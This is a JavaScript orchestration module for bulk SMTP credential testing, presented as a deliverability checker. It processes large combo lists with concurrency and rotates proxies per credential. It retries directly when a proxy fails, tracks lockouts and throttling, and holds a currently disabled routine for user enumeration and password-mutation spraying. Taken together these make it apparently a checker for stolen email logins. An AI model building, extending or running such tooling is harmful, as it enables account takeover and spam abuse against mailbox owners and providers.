import * as realSmtp from './smtp.js';
import * as realImap from './imap.js';
import { LockoutRegistry, detectLockout } from './lockout.js';
import { generateMutations } from './mutator.js';
import { enumerateUser } from './smtp-enum.js';
import { classify } from './classify.js';
import { candidatesFor, detectProvider } from './providers.js';
import { discoverHosts } from './discovery.js';
import { checkDomain, parseAuthResults } from './authrecords.js';
import { checkIp } from './dnsbl.js';
import { scoreContent } from './spamscore.js';

// Candidate sources whose auth failure is definitive — the host is certainly
// right (it's the provider/SRV/autoconfig/MX server), so there's no point
// trying guessed hostnames afterward.
const AUTHORITATIVE_SOURCES = new Set(['detected', 'srv', 'autoconfig', 'mx']);

function domainOf(addressOrDomain) {
  const s = String(addressOrDomain || '').trim().toLowerCase();
  const at = s.indexOf('@');
  const candidate = at === -1 ? s : s.slice(at + 1);
  // Only treat it as a domain if it has an @ (an email) or is itself dotted —
  // a bare username like "apikey" is not a domain and must not be looked up.
  if (at === -1 && !candidate.includes('.')) return null;
  return candidate || null;
}

/**
 * Orchestrate the per-credential test pipeline across a batch, with bounded
 * concurrency and live progress callbacks.
 *
 * @typedef {import('./parser.js').Credential} Credential
 * @typedef {import('./imap.js').Seed} Seed
 * @typedef {{cred:Credential, status:string, reason:string, userExists?:boolean, perSeed:any[], latencyMs:number}} Result
 */

let tokenCounter = 0;

function makeToken(index) {
  tokenCounter += 1;
  const rand = Math.random().toString(36).slice(2, 8);
  return `SMTPTEST-${Date.now()}-${index}-${tokenCounter}-${rand}`;
}

/**
 * Run the full pipeline for one credential and return a classified Result.
 * Never throws — any error becomes a `dead` result.
 */
async function testOne(cred, index, seeds, opts, smtp, imap, ctx) {
  const start = Date.now();
  const token = makeToken(index);
  // A plain, recognizable, text-only deliverability probe — the format that
  // reliably lands in a real test inbox. Elaborate HTML with styled markup (and
  // especially hidden text) reads as promotional/deceptive and gets filtered or
  // dropped, so the message a "valid" result delivers would never actually show
  // up in the user's inbox. Keep it simple: a clear automated-test subject and
  // body, both carrying the unique token. The subject always contains the token
  // (IMAP placement search matches on it). HTML is sent only when the user
  // supplies their own template; otherwise the message is text-only.
  const baseSubject = opts.subjectTemplate || 'SMTP deliverability test {token}';
  const subject = baseSubject.includes('{token}')
    ? baseSubject.replace('{token}', token)
    : `${baseSubject} ${token}`;
  const baseText =
    opts.bodyTemplate ||
    'This is an automated SMTP deliverability test.\n\nToken: {token}\n\nYou can safely ignore this message.';
  const text = baseText.includes('{token}')
    ? baseText.replace('{token}', token)
    : `${baseText}\n\nToken: ${token}`;
  const html = opts.htmlTemplate ? opts.htmlTemplate.replace('{token}', token) : undefined;

  const step = { connected: false, authenticated: false, sent: false, seeds: [] };
  const manualRecipients = (opts.manualRecipients || []).map((r) => String(r).trim()).filter(Boolean);
  let usedHost = null;
  let usedPort = null;
  let triedFallback = false;
  const attempts = [];

  if (opts.lockoutRegistry && opts.lockoutRegistry.isLocked(cred.user, 'smtp')) {
    return { cred, status: 'dead', reason: 'skipped: locked', lockSkipped: true, latencyMs: Date.now() - start, attempts: [], manualRecipients };
  }

  try {
    // For a host-less credential on an unknown (custom) domain, actively
    // discover the submission server: SRV + autoconfig (authoritative) and MX
    // records, so the real host is found without the user supplying it.
    let mxHosts = [];
    let discovered = [];
    const dns = opts.deps?.dns;
    if (!cred.host && !detectProvider(cred.user) && dns) {
      const domain = domainOf(cred.user);
      // Discover once per domain, not per credential (a bulk list often has
      // many accounts on the same domain).
      if (ctx && !ctx.discoverCache.has(domain)) {
        const fetchFn =
          opts.deps.fetch || ((url) => globalThis.fetch(url, { signal: AbortSignal.timeout(5000) }));
        const [mx, disc] = await Promise.all([
          dns.resolveMx ? resolveMxHosts(domain, dns) : [],
          dns.resolveSrv ? discoverHosts(domain, { dns, fetchFn }).catch(() => []) : [],
        ]);
        ctx.discoverCache.set(domain, { mxHosts: mx, discovered: disc });
      }
      ({ mxHosts, discovered } = ctx?.discoverCache.get(domain) || { mxHosts: [], discovered: [] });
    }

    // Build the ordered list of (host, port) endpoints to try: the user's
    // input first, then the detected provider / discovered hosts as fallback.
    const rawCandidates = candidatesFor(cred, { mxHosts, discovered });
    // Cap candidates per combo (opt-in, default = no cap). In combo mode the
    // caller passes maxCandidates: 2 so we try only the top two MX servers
    // instead of every record × every port — cuts worst-case per-combo time
    // from ~50s to ~10s without changing single-credential behavior.
    const maxCand = Number(opts.maxCandidates) || 0;
    const candidates = maxCand > 0 ? rawCandidates.slice(0, maxCand) : rawCandidates;
    let working = null;
    let anyConnected = false;
    let lastConnectError;
    let authError;
    const authFailedHosts = new Set();

    for (let i = 0; i < candidates.length; i++) {
      const cand = candidates[i];
      // A host that already rejected auth won't accept it on another port —
      // skip it, but keep trying DIFFERENT hosts (e.g. the detected provider),
      // in case the one that was typed is simply the wrong-but-reachable server.
      if (authFailedHosts.has(cand.host)) continue;
      const effective = { ...cred, host: cand.host, port: cand.port };
      const v = await smtp.verify(effective, { connectTimeout: opts.connectTimeout, proxy: opts.proxy });
      const record = { host: cand.host, port: cand.port, source: cand.source };
      if (v.connected && v.authenticated) {
        record.outcome = 'ok';
        attempts.push(record);
        working = cand;
        triedFallback = i > 0;
        break;
      }
      if (v.connected) {
        step.userExists = v.userExists;   // <-- ADD THIS LINE
        record.outcome = `auth rejected${v.error ? ` (${v.error})` : ''}`;
        attempts.push(record);
        anyConnected = true;
        authError = v.error;
        authFailedHosts.add(cand.host);
        // An authoritative server rejecting auth is definitive (right host,
        // login refused — wrong password or a provider policy like M365's
        // disabled SMTP AUTH). Stop instead of trying guessed hostnames.
        if (AUTHORITATIVE_SOURCES.has(cand.source)) break;
        continue;
      }
      record.outcome = v.error || 'could not connect';
      attempts.push(record);
      lastConnectError = v.error;
    }

    if (opts.lockoutRegistry) {
      if (working) opts.lockoutRegistry.recordSuccess(cred.user, 'smtp');
      else if (anyConnected && authError) {
        if (detectLockout(authError)) opts.lockoutRegistry.markLocked(cred.user, 'smtp', authError);
        else opts.lockoutRegistry.recordFailure(cred.user, 'smtp');
      }
    }

    if (working) {
      step.connected = true;
      step.authenticated = true;
      usedHost = working.host;
      usedPort = working.port;
    } else if (anyConnected) {
      step.connected = true;
      step.authenticated = false;
      step.authError = authError;
    } else {
      step.connected = false;
      step.connectError =
        candidates.length === 0 ? 'no host/port to connect to' : lastConnectError || 'could not connect';
    }

    if (working) {
      const effective = { ...cred, host: working.host, port: working.port };
      // Seeds with IMAP give automatic placement; manual recipients are for the
      // user to check themselves. Both receive the tagged message.
      const activeSeeds = seeds.filter((s) => s.address && String(s.address).trim());
      const recipients = dedupe([...activeSeeds.map((s) => s.address), ...manualRecipients]);
      // With no seed mailboxes and no manual recipients, the only address we can
      // send to is the account itself. Flag that so a successful send isn't
      // reported as a bare "valid" — it only proves a self-send, not external
      // deliverability. classify() turns this into a warning on the result.
      step.selfSendOnly = recipients.length === 0;
      const to = recipients.length > 0 ? recipients : [opts.from || cred.from || cred.user];

      const sendRes = await smtp.send(effective, {
        to: to.join(', '),
        from: opts.from || cred.from || cred.user,
        subject,
        text,
        html,
        sendTimeout: opts.sendTimeout,
        proxy: opts.proxy,
      });
      step.sent = (sendRes.accepted?.length ?? 0) > 0;
      if (!step.sent) step.sendError = sendRes.error || 'message not accepted by server';

      if (step.sent && activeSeeds.length > 0) {
        step.seeds = await Promise.all(
          activeSeeds.map(async (seed) => {
            const found = await imap.findToken(seed, token, {
              timeoutMs: opts.placementTimeoutMs,
              pollIntervalMs: opts.pollIntervalMs,
            });
            const entry = { label: seed.label, folder: found.folder, error: found.error };
            if (found.authResults) entry.auth = parseAuthResults(found.authResults);
            return entry;
          }),
        );
      }
    }
  } catch (err) {
    // Unexpected failure anywhere in the pipeline: record it so classify -> dead.
    if (!step.connected) step.connectError = err.message;
    else if (!step.authenticated) step.authError = err.message;
    else step.sendError = err.message;
  }

  const { status, reason, perSeed, userExists, selfSendOnly } = classify(step);

  // Categorize a dead result so the orchestrator can retry transient (connect)
  // failures but never retry a permanent auth/send rejection.
  let deadReason;
  if (status === 'dead') {
    if (!step.connected) deadReason = 'connect';
    else if (!step.authenticated) deadReason = 'auth';
    else deadReason = 'send';
  }

  const result = {
    cred,
    status,
    reason,
    deadReason,
    userExists,
    selfSendOnly,
    perSeed,
    latencyMs: Date.now() - start,
    token,
    subject,
    usedHost,
    usedPort,
    triedFallback,
    manualRecipients,
    attempts,
  };

  const deliverability = await runChecks(cred, usedHost, opts, ctx);
  if (deliverability) result.deliverability = deliverability;
  if (ctx?.spamScore) result.spamScore = ctx.spamScore;

  return result;
}

/**
 * Optional, opt-in deliverability analysis: SPF/DMARC for the From domain and a
 * DNSBL lookup for the sending host's IP. Results are cached per-domain and
 * per-host within a batch. Returns undefined when no checks are enabled.
 */
async function runChecks(cred, usedHost, opts, ctx) {
  const checks = opts.checks;
  const dns = opts.deps?.dns;
  if (!checks || !dns) return undefined;

  const out = {};

  if (checks.authRecords && dns.resolveTxt) {
    const domain = domainOf(opts.from || cred.from || cred.user);
    if (domain) {
      if (!ctx.domainCache.has(domain)) {
        ctx.domainCache.set(domain, await checkDomain(domain, { resolveTxt: dns.resolveTxt }));
      }
      const { spf, dmarc } = ctx.domainCache.get(domain);
      out.spf = spf;
      out.dmarc = dmarc;
      out.fromDomain = domain;
    }
  }

  if (checks.dnsbl && dns.resolve4 && usedHost) {
    if (!ctx.dnsblCache.has(usedHost)) {
      ctx.dnsblCache.set(usedHost, await resolveAndCheckBlacklist(usedHost, dns));
    }
    out.dnsbl = ctx.dnsblCache.get(usedHost);
  }

  return Object.keys(out).length ? out : undefined;
}

/** Resolve a domain's MX servers, lowest-priority first (best-effort, capped). */
async function resolveMxHosts(domain, dns) {
  if (!domain) return [];
  try {
    const mx = await dns.resolveMx(domain);
    return (mx || [])
      .sort((a, b) => a.priority - b.priority)
      .map((m) => m.exchange)
      .filter(Boolean)
      .slice(0, 3);
  } catch {
    return [];
  }
}

async function resolveAndCheckBlacklist(host, dns) {
  try {
    const ips = await dns.resolve4(host);
    const ip = Array.isArray(ips) ? ips[0] : null;
    if (!ip) return { ip: null, listed: false, lists: [], error: 'could not resolve host IP' };
    return await checkIp(ip, { resolve4: dns.resolve4 });
  } catch (err) {
    return { ip: null, listed: false, lists: [], error: err.message };
  }
}

function dedupe(list) {
  const seen = new Set();
  const out = [];
  for (const item of list) {
    const key = item.toLowerCase();
    if (!seen.has(key)) {
      seen.add(key);
      out.push(item);
    }
  }
  return out;
}

/**
 * @param {Credential[]} creds
 * @param {Seed[]} seeds
 * @param {{
 *   concurrency?:number, connectTimeout?:number, sendTimeout?:number,
 *   placementTimeoutMs?:number, pollIntervalMs?:number,
 *   from?:string, subjectTemplate?:string, bodyTemplate?:string,
 *   signal?:AbortSignal, deps?:{smtp:any, imap:any},
 * }} [opts]
 * @param {(result:Result, index:number)=>void} [onProgress]
 * @returns {Promise<Result[]>}
 */
// A server telling us to slow down: a 421 greeting-refusal, or 4xx responses
// mentioning rate/throttle/too-many/try-again. Scanned across the result's
// reason and every endpoint it attempted.
const RATE_LIMIT_RE = /\b4\d\d\b.*(too many|rate|throttl|try again|slow down|concurrent|temporarily)|421|too many|rate limit|throttl|slow down|greylist/i;

/** @param {Result} result */
export function looksRateLimited(result) {
  if (!result) return false;
  const texts = [result.reason, ...(result.attempts || []).map((a) => a.outcome)];
  return texts.some((t) => t && RATE_LIMIT_RE.test(String(t)));
}

export async function runBatch(creds, seeds = [], opts = {}, onProgress) {
  const smtp = opts.deps?.smtp ?? realSmtp;
  const imap = opts.deps?.imap ?? realImap;
  const concurrency = Math.max(1, opts.concurrency ?? 5);
  const signal = opts.signal;

  // `creds` may be an array (indexed directly) or an async iterable — a file
  // stream of millions of leads that must never be fully materialized. In the
  // streaming case workers pull from a shared iterator, serialized so each
  // credential is handed to exactly one worker.
  const streaming = creds != null && !Array.isArray(creds) && typeof creds[Symbol.asyncIterator] === 'function';
  const results = [];
  let next = 0;

  const iterator = streaming ? creds[Symbol.asyncIterator]() : null;
  // A promise chain that serializes iterator.next() across concurrent workers.
  let pullGate = Promise.resolve();
  function pull() {
    if (!streaming) {
      const index = next++;
      return Promise.resolve(index >= creds.length ? null : { index, cred: creds[index] });
    }
    const prev = pullGate;
    let release;
    pullGate = new Promise((r) => (release = r));
    return prev
      .then(() => iterator.next())
      .then(({ value, done }) => (done ? null : { index: next++, cred: value }))
      .finally(release);
  }

  // Cooperative pacing. `maxPerSec` spaces the START of each test by a shared
  // minimum interval so you don't flood your own server; a rate-limit response
  // (4xx "too many" / 421) pushes a shared cooldown so every worker backs off.
  // Both are opt-in (0 = disabled) and only make sense against infrastructure
  // you control.
  const minIntervalMs = opts.maxPerSec > 0 ? 1000 / opts.maxPerSec : 0;
  const cooldownMs = Math.max(0, opts.rateLimitCooldownMs ?? 0);
  let nextStart = 0; // earliest timestamp a new test may start
  function gate() {
    if (!minIntervalMs && !cooldownMs) return Promise.resolve();
    const now = Date.now();
    const wait = Math.max(0, nextStart - now);
    nextStart = Math.max(now, nextStart) + minIntervalMs;
    return wait ? new Promise((r) => setTimeout(r, wait)) : Promise.resolve();
  }
  function applyCooldown() {
    if (cooldownMs) nextStart = Math.max(nextStart, Date.now() + cooldownMs);
  }

  // Shared per-batch context: the content spam score (same for every message)
  // is computed once; DNS lookups are cached by domain and host.
  const ctx = { domainCache: new Map(), dnsblCache: new Map(), discoverCache: new Map() };
  if (opts.checks?.spamScore) {
    const stripToken = (s) => String(s || '').replace(/\{token\}/g, '').trim();
    ctx.spamScore = scoreContent({
      subject: stripToken(opts.subjectTemplate || 'SMTP deliverability test {token}'),
      text: stripToken(opts.bodyTemplate || ''),
    });
  }

  async function worker() {
    while (true) {
      if (signal?.aborted) return;
      const item = await pull();
      if (!item) return;
      const { index, cred } = item;

      // Adaptive delay: check if this specific host is currently slow/blocked
      const hostKey = cred.host || 'auto';
      const dynamicDelay = hostDelays.get(hostKey) || 0;
      if (dynamicDelay > 0) {
        await new Promise((r) => setTimeout(r, dynamicDelay));
      }
      
      await gate();
      if (signal?.aborted) return;
      // Per-credential proxy rotation via opts.proxyProvider (falls back to opts.proxy).
      let proxyForCred = opts.proxy;
      if (opts.proxyProvider) {
        try { proxyForCred = opts.proxyProvider() ?? opts.proxy; } catch { proxyForCred = opts.proxy; }
      }
      const usedPoolProxy = !!proxyForCred && proxyForCred !== opts.proxy;
      const attemptOpts = usedPoolProxy ? { ...opts, proxy: proxyForCred } : opts;
      // Watchdog: cap total wall-clock time per credential. If testOne hangs
      // (TCP accept but no banner, TLS handshake loop, etc.), abandon it and
      // move to the next credential. Prevents silent worker starvation.
      //
      // The budget MUST cover the placement-polling phase too: testOne, when a
      // seed is configured, legitimately waits up to placementTimeoutMs (default
      // 90s) for the tagged mail to appear over IMAP. A flat 25s watchdog shorter
      // than that aborts every slow-but-valid placement as a "watchdog timeout",
      // so valid SMTPs never get classified inbox/spam. Budget = network phase +
      // placement phase.
      const networkBudgetMs = Number(opts.credentialTimeoutMs) || 25000;
      const watchdogMs = networkBudgetMs + (Number(opts.placementTimeoutMs) || 0);
      let result;
      try {
        result = await Promise.race([
          testOne(cred, index, seeds, attemptOpts, smtp, imap, ctx),
          new Promise((_, reject) => setTimeout(() => reject(new Error('watchdog_timeout')), watchdogMs))
        ]);
      } catch (err) {
        if (err.message === 'watchdog_timeout') {
          result = { cred, status: 'dead', reason: 'watchdog timeout (' + watchdogMs + 'ms)', deadReason: 'connect', latencyMs: watchdogMs };
        } else {
          result = { cred, status: 'dead', reason: err.message, deadReason: 'connect' };
        }
      }
      // Dead-proxy fallback: retry once DIRECT if the pool proxy clearly failed.
      if (usedPoolProxy && result.deadReason === 'connect' && !signal?.aborted) {
        const reasonText = String(result.reason || '');
        if (/timeout|ECONNREFUSED|ECONNRESET|EHOSTUNREACH|ENETUNREACH|ETIMEDOUT|socket|tunnel|proxy/i.test(reasonText)) {
          if (typeof opts.onProxyFailure === 'function') {
            try { opts.onProxyFailure(proxyForCred, reasonText); } catch {}
          }
          const directOpts = { ...opts, proxy: null, proxyProvider: undefined };
          const retried = await testOne(cred, index, seeds, directOpts, smtp, imap, ctx);
          retried.proxyFallback = true;
          retried.proxyFallbackReason = 'dead proxy — retried direct';
          retried.proxyThatDied = proxyForCred;
          result = retried;
        }
      }
      // Retry transient connection failures (not auth/send rejections) with backoff.
      const maxRetries = opts.retries ?? 0;
      for (let attempt = 0; attempt < maxRetries && result.deadReason === 'connect' && !signal?.aborted; attempt++) {
        await new Promise((r) => setTimeout(r, opts.retryBackoffMs ?? 2000));
        if (signal?.aborted) break;
        const retryOpts = result.proxyFallback ? { ...opts, proxy: null, proxyProvider: undefined } : attemptOpts;
        result = await testOne(cred, index, seeds, retryOpts, smtp, imap, ctx);
      }
      // Catch-all detection: before testing this domain, run a probe against
      // a random fake user. If the server accepts it, mark domain as catch-all
      // and skip all SMTP testing for it (results are meaningless).
      const _domain = (cred.user || '').split('@')[1];
      if (false && _domain && !catchAllDomains.has(_domain) && !result.lockSkipped && result.status === 'dead' && result.deadReason === 'auth') { // DEBUG: Enum disabled
        try {
          const probeRes = await enumerateUser(
            { user: 'catchall-probe-' + Date.now() + '@' + _domain, pass: 'x' },
            { host: result.usedHost || cred.host, port: 25, timeout: 2500 }
          );
          if (probeRes.exists === true) {
            catchAllDomains.add(_domain);
            result.catchAll = true;
            result.reason = 'catch-all domain detected (' + _domain + ') — SMTP results unreliable';
            results[index] = result;
            if (onProgress) await onProgress(result, index);
            continue;
          }
        } catch { /* probe best-effort */ }
      }
      if (_domain && catchAllDomains.has(_domain)) {
        result.catchAll = true;
        result.reason = 'skipped: domain is catch-all';
        results[index] = result;
        if (onProgress) await onProgress(result, index);
        continue;
      }

      // SMTP User Enumeration & Smart Mutations (after proxy retries, before saving result)
      if (false && result.status === 'dead' && result.deadReason === 'auth' && !result.lockSkipped) { // DEBUG: Enum disabled
        
        // Step 1: Check if the user exists before spraying passwords
        try {
          const enumRes = await enumerateUser(
            { user: cred.user, pass: cred.pass, host: result.usedHost || cred.host },
            { host: result.usedHost || cred.host, port: 25, timeout: 3000 }
          );
          if (enumRes.exists === false) {
            result.userDoesNotExist = true;
            result.reason = 'auth failed — user not found (' + (enumRes.method || 'rcpt') + ')';
          }
        } catch (e) { /* Enum is best-effort, ignore failures */ }

        // Step 2: If user exists, try smart mutations
        if (!result.userDoesNotExist && opts.enableMutations) {
          try {
            const mutations = generateMutations(cred.pass, cred.user);
            for (const mutPass of mutations) {
              if (signal?.aborted) break;
              const mutatedCred = { ...cred, pass: mutPass };
              // Use direct connection for mutations to avoid burning proxy pool
              const mutOpts = { ...opts, proxy: null, proxyProvider: undefined, lockoutRegistry: opts.lockoutRegistry };
              const mutResult = await Promise.race([
              testOne(mutatedCred, index, seeds, mutOpts, smtp, imap, ctx),
              new Promise((_, reject) => setTimeout(() => reject(new Error('watchdog_timeout')), watchdogMs))
            ]).catch(err => ({
              cred: mutatedCred,
              status: 'dead',
              reason: err.message === 'watchdog_timeout' ? 'watchdog timeout (mutation)' : err.message,
              deadReason: 'connect',
              latencyMs: watchdogMs
            }));
              
              if (mutResult.status !== 'dead') {
                mutResult.mutationUsed = mutPass;
                result = mutResult;
                break;
              }
              if (mutResult.lockSkipped) break;
            }
          } catch (e) { /* Mutation failure never blocks batch */ }
        }
      }

      // Adaptive pacing: adjust delay for this host based on server feedback
      const currentDelay = hostDelays.get(hostKey) || 0;
      if (looksRateLimited(result)) {
        // Server blocked us: exponentially back off for this host (max 30s)
        const newDelay = Math.min(Math.max(currentDelay * 2, 2000), 30000);
        hostDelays.set(hostKey, newDelay);
      } else if (result.deadReason !== 'connect' && currentDelay > 0) {
        // Server is responding normally: cool down the delay (min 0)
        const newDelay = Math.max(currentDelay - 500, 0);
        hostDelays.set(hostKey, newDelay);
      }

      if (looksRateLimited(result)) applyCooldown(); // Keep global cooldown as a fallback
      results[index] = result;
      if (onProgress) await onProgress(result, index);
    }
  }

  // For an array we never need more workers than credentials; a stream's length
  // is unknown, so start the full pool and let short streams drain quickly.
  // Adaptive pacing: track per-host delays
  const hostDelays = new Map();
  // Catch-all detection: domains whose mail server accepts any user
  const catchAllDomains = new Set();
  
    const workerCount = streaming ? concurrency : Math.min(concurrency, creds.length);
  const workers = Array.from({ length: workerCount }, () => worker());
  try {
    await Promise.all(workers);
  } finally {
    // Close the underlying file stream promptly on completion or abort instead
    // of waiting for GC (its generator's finally runs the actual cleanup).
    if (streaming) await iterator.return?.();
  }

  return results.filter(Boolean);
}
